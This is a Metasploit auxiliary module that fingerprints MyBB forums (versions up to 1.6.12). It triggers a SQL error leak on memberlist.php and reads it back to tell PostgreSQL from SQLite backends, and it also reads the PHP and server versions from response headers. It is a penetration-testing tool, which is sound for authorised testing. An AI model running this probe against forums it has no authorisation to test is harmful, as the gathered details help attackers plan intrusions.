##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name' => 'Determinant Databases MyBB ',
      'Description' => %q{
        Determine the database in the forum.
        This affects versions <= 1.6.12
      },
      'Author' =>
        [
          #http://www.linkedin.com/pub/arthur-karmanovskii/82/923/812
          'Arthur Karmanovskii <fnsnic[at]gmail.com>'#Discovery and Metasploit Module
        ],
      'License' => MSF_LICENSE,
      'References' =>
        [
          [ 'URL', 'https://github.com/rapid7/metasploit-framework/pull/3070' ]
        ],
      'DisclosureDate' => 'Feb 13 2014'))

    register_options(
      [
        OptString.new('TARGETURI', [ true, "MyBB forum directory path", '/forum'])
      ], self.class)
  end

  def check
  begin
    uri = normalize_uri(target_uri.path, '/index.php?intcheck=1')
    res = send_request_cgi(
      {
        'method'  => 'GET',
        'uri'     => uri,
        'vars_get' => {
          'Accept' => 'text/html, application/xhtml+xml, */*',
          'Accept-Language' => 'ru-RU',
          'User-Agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko',
          'Accept-Encoding' => 'gzip, deflate',
          'Connection' => 'Close',
          'Cookie' => "mybb[lastvisit]="+Time.now.to_i.to_s+"; mybb[lastactive]="+Time.now.to_i.to_s+"; loginattempts=1"
          }
      })
    if res.nil?
      print_error("Failed to retrieve webpage.")
      return Exploit::CheckCode::Unknown
    end

    if res.code != 200
      print_error("Unable to query to host:  #{datastore['RHOST']}:#{datastore['RPORT']}  (#{datastore['TARGETURI']}).")
      return Exploit::CheckCode::Unknown
    end

    #Check PhP
    php_version = res['X-Powered-By']
    if php_version
      php_version = " PHP Version: #{php_version}".ljust(40)
    else
      php_version = " PHP Version: unknown".ljust(40)
    end

    #Check Web-Server
    web_server = res['Server']
    if web_server
      web_server = " Server Version: #{web_server}".ljust(40)
    else
      web_server = " Server Version: unknown".ljust(40)
    end

    #Check forum MyBB
    if res.body.match("&#077;&#089;&#066;&#066;")
      print_good("Congratulations! This forum is MyBB :) "+"HOST: "+datastore['RHOST'].ljust(15)+php_version+web_server)
      return Exploit::CheckCode::Detected
    else
      print_status("This forum is not guaranteed to be MyBB"+"HOST: "+datastore['RHOST'].ljust(15)+php_version+web_server)
      return Exploit::CheckCode::Unknown
    end
    rescue RuntimeError => err
      print_error("Unhandled error in #{datastore['RHOST']}: #{err.class}: #{err}")
      return Exploit::CheckCode::Unknown
    end

  end


  def run
    uri = normalize_uri(target_uri.path, '/memberlist.php?letter=-1')
    response = send_request_cgi(
      {
        'method'  => 'GET',
        'uri'     => uri,
        'vars_get' => {
          'Accept' => 'text/html, application/xhtml+xml, */*',
          'Accept-Language' => 'ru-RU',
          'User-Agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko',
          'Accept-Encoding' => 'gzip, deflate',
          'Connection' => 'Close',
          'Cookie' => "mybb[lastvisit]="+Time.now.to_i.to_s+"; mybb[lastactive]="+Time.now.to_i.to_s+"; loginattempts=1"
          }
      })
    if response.nil?
      print_error("Failed to retrieve webpage.")
      return
    end

    #Resolve response
    if response.body.match(/SELECT COUNT\(\*\) AS users FROM mybb_users u WHERE 1=1 AND u.username NOT REGEXP\(\'\[a-zA-Z\]\'\)/)
      print_good("Database is: PostgreSQL ;)")
    elsif response.body.match(/General error\: 1 no such function\: REGEXP/)
      print_good("Database is: SQLite ;)")
    else
      print_status("Database MySQL or this is not forum MyBB or unknown Database")
    end
  end
end
